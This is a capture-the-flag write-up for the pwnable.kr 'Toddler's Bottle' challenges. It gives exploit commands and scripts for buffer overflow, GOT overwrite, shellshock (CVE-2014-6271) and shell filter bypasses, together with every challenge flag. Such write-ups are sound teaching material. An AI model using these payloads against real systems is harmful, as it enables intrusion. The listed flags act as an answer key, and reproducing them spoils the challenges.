# Toddler's Bottle

## fd
use 4660 as argument(-> fd = 4660 - 0x1234 = 0 = stdin)
and then enter 'LETMEWIN'
#### Flag 
mommy! I think I know what a file descriptor is!!

## collision
We need to insert string the when sum up as integer will equal to 
Choose one of the input from the output of this [python script](https://gist.github.com/bom2013/63ec0bc880f6a82e775d9dce7a2358fe), for example the generated arg for 'P' letter
```bash
col@pwnable:~$ python3 /tmp/collision_arg_generator.py
....
-----
Test P
Oh yeh!
0x50505050 0x50505050 0x50505050 0x50505050 0xe09bc8ac
...
col@pwnable:~$ ./col `printf "PPPPPPPPPPPPPPPP\xac\xc8\x9b\xe0"`
```  
#### Flag 
daddy! I just managed to create a hash collision :)

## bof
Simple buffer overflow, I try to do it directedly from the shell without success, so do it with python `pwntools` lib
```python
from pwn import *

message = 'a'*52 + "\xbe\xba\xfe\xca"
nc = remote("pwnable.kr",9000)
nc.send(message)
nc.interactive()
```  
**Flag**  
daddy, I just pwned a buFFer :)

## flag
Use 'strings' to search which packer -> UPX  
Use 'upx -d flag' to unpack  
Use 'string' to find the flag  
#### Flag 
UPX...? sounds like a delivery service :)


## passcode
When gcc the file get warning about pass 'int' and not 'int *'  
This means writing to a value that is in the variable 'passcode1'-> Junk seemingly  
Is there a way to change it before we get there and thus write to the good place?  
In the "welcome" function(Which performed before login function) we write to 'name', by using gdb you see the location of **'name'** variable in the stack:
```
(gdb) disas welcome
Dump of assembler code for function welcome:
   ...
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   ...
End of assembler dump.
```
-> &name = ebp-0x70  
welcome and login using the same stack...  
lets see the location of **'passcode1'** in the stack using gdb:
```
(gdb) disas login
Dump of assembler code for function login:
   ...
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   ...
End of assembler dump.
```
-> &passcode1 = ebp-0x10  
-> the distance between them is 0x70-0x10 = 96, we can write 100 -> we can overwrite 4 byte of passcode1 -> Yoo!  
What will we write? We want to put a value of a place in the memory that we then jump from, Fortunately we have a call to the **fflush** function that is not executed directly but through the plt mechanism so we have a jump:
```
(gdb) disas fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    *0x804a004
   0x08048436 <+6>:     push   $0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
```
So if we put the value 0x804a004 in passcode before we get input to him, when we will get the the point we put input we can insert the address we want the program to jump to.  
Lets find this address using gdb:
```
(gdb) disas login
Dump of assembler code for function login:
   ...
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)   # "/bin/cat flag"
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   ...
End of assembler dump.
```
So, we will put 96 garbage chars and than 0x0804a004 to **'name'** and then enter 0x080485e3 to passcode1:
```shell
passcode@pwnable:~$ python -c "print 'A'*96 + '\x04\xa0\x04\x08' + str(int('0x080485e3', 16))" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
```  
#### Flag 
Sorry mom.. I got confused about scanf usage :(


## random
rand() without seed -> always the same series of numbers ...  
The series begins with 1804289383  
-> 0xdeadbeef ^ 1804289383 = 3039230856  
#### Flag 
Mommy, I thought libc random is unpredictable...


## input
5 steps, each requiring a different form of software input (command line arguments, Pipes, user environment, files and sockets).  
I built the [following program](https://gist.github.com/bom2013/51c6012dfa826b4d0aa73e736115760c) (C, I know it's horrible, but got into trouble with the pwn library in Python😅)
To run the server-side script, follow these steps:
```shell
input2@pwnable:~$ mkdir /tmp/asdf
input2@pwnable:~$ cd /tmp/asdf
input2@pwnable:/tmp/asdf$ ln -s /home/input2/flag flag
input2@pwnable:/tmp/asdf$ nano input-sol.c
input2@pwnable:/tmp/asdf$ gcc input-sol.c -o input-sol
input2@pwnable:/tmp/asdf$ ./input-sol
Welcome to pwnable.kr
Let's see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
Stage 2 clear!
Stage 3 clear!
Stage 4 clear!
Stage 5 clear!
Mommy! I learned how to pass various input in Linux :)
```  
#### Flag 
Mommy! I learned how to pass various input in Linux :)


## leg
This is basic ARM Reverse Engineering challenge :)  
we need key = key1()+key2()+key3()  
### key1
key1() return the value of 'pc' register, in ARM its 2 instruction ahead: 
```
(gdb) disass key1
Dump of assembler code for function key1:
   ...
   0x00008cdc <+8>:	mov	r3, pc         <= here whe get pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0    <= pc point to here
   ...
End of assembler dump.
```
-> key1 =  0x00008ce4
### key2
key2() do some gibberish and than return pc at some point
```
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1	; r6 = pc+1 = 0x00008d04+1
   0x00008d00 <+16>:	bx	r6 			; jump to next instruction(0x00008d04) and change to Thumb mode
   0x00008d04 <+20>:	mov	r3, pc		; r3 = pc = 0x00008d08
   0x00008d06 <+22>:	adds	r3, #4	; r3 = r3+4 = 0x00008d0c
   ...
   0x00008d10 <+32>:	mov	r0, r3 		; r0 = r3 = 0x00008d0c
End of assembler dump.
```
-> key2 = 0x00008d0c
### key3
key3() return the **lr** register
```
(gdb) disass main
Dump of assembler code for function main:
   ...
   ; key1()
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   ; key2()
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   ; key3()
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0 			<= lr point to return address
   0x00008d84 <+72>:	add	r2, r4, r3
   ...
```
-> key3 = 0x00008d80  
=> key = key1 + key2 + key3 = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400  
#### Flag 
My daddy has a lot of ARMv5te muscle!

## mistake
In running the program he receives input twice for some reason.  
When examining the code you notice a wonderful weakness, carelessness and fall in [Operator Precedence](https://en.cppreference.com/w/c/language/operator_precedence):
```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
}
```
the operator '<' is performed before the operator '=' so what actually happens is that we open the file (returns 1 since the file exists and should not be a problem in opening it), comparing the result(1) to 0 (certainly not less than 0) -> Returns 0 and we puts the result in fd, so that in practice when you read from fd you read from stdin.
So all it takes is to insert a string in pw_buf and a string in pw_buf2 so that their comparison (after the xor function) is equal.  
We will use an auxiliary function to calculate the xor:
```python
def xor(s):
   return "".join([chr(ord(i)^1) for i in s])
pw_buf = "AAAAAAAAAA"
pw_buf2 = xor(pw_buf)
print("pw_buf:", pw_buf)                     # AAAAAAAAAA
print("pw_buf2:", pw_buf2)                   # @@@@@@@@@@
```
#### Flag
Mommy, the operator priority always confuses me :(


## shellshock
The name of the challenge quite indicates the weakness...  
The machine is vulnerable to [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271) ('shellshock') (this can also be seen by checking the bash version):
```shell
shellshock@pwnable:~$ env VAR='() { :; }; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```
#### Flag
only if I knew CVE-2014-6271 ten years ago..!!

## coin1
Use [this](https://gist.github.com/bom2013/e3d30f0b362a1177d2c40c0cba6a411c) script to doing the calculation(binary search :))
```shell
server@pwnable:$ python coin1.py
[x] Opening connection to localhost on port 9007
[x] Opening connection to localhost on port 9007: Trying ::1
[x] Opening connection to localhost on port 9007: Trying 127.0.0.1
[+] Opening connection to localhost on port 9007: Done
0
('message:', u'N=895 C=10\n')
...
Congrats! get your flag
b1NaRy_S34rch1nG_1s_3asy_p3asy
```
#### Flag
b1NaRy_S34rch1nG_1s_3asy_p3asy


## blackjack
Simple text-based blackjack game, but when he check bet he doesn't check if the bet is negative number:
```c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);

 if (bet > cash) //If player tries to bet more money than player has
 {
		printf("\nYou cannot bet more money than you have.");
		printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```
We want more than million so lets enter big negative number:
```shell
Cash: $500
-------
|C    |
|  5  |
|    C|
-------

Your Total is 5

The Dealer Has a Total of 10

Enter Bet: -9999999999


Would You Like to Hit or Stay?
Please Enter H to Hit or S to Stay.
S

You Have Chosen to Stay at 5. Wise Decision!

The Dealer Has a Total of 18
Dealer Has the Better Hand. You Lose.

You have 0 Wins and 1 Losses. Awesome!

Would You Like To Play Again?
Please Enter Y for Yes or N for No
Y

YaY_I_AM_A_MILLIONARE_LOL
```
#### Flag
YaY_I_AM_A_MILLIONARE_LOL


## lotto
The program create 6 letter lotto code(1-45) and then for some reason comapre *every* letter in input to every letter in the lotto number.
we need the comparesion to be equal six time, we can guess the number(very stupid strategy) or we can try input 6 same digits, if the digits is somewhere in the lotto is will compare to it 6 time(one for every digit in the input), we need letter between 1-45, I choose '+', its take some time and then work:
```shell
lotto@pwnable:~$ ./lotto
- Select Menu -
1. Play Lotto
2. Help
3. Exit
1
Submit your 6 lotto bytes : ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
....
sorry mom... I FORGOT to check duplicate numbers... :(
```
#### Flag
sorry mom... I FORGOT to check duplicate numbers... :(


## cmd1
We need to insert code that will print flag and will not contain 'flag', 'sh' or 'tmp':
```shell
cmd1@pwnable:~$ ./cmd1 'a='fl' && b='ag' && /bin/cat "${a}${b}"'
mommy now I get what PATH environment is for :)
```
#### Flag
mommy now I get what PATH environment is for :)

## cmd2
Same as cmd1, more filter, use printf(with octa character) to start python
```shell
pwnable% ./cmd2 '$(printf \\057usr\\057bin\\057python)'
$(printf \\057usr\\057bin\\057python)
Python 2.7.12 (default, Mar  1 2021, 11:38:31)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> open('flag', 'r').read()
'FuN_w1th_5h3ll_v4riabl3s_haha\n'
```
#### Flag
FuN_w1th_5h3ll_v4riabl3s_haha
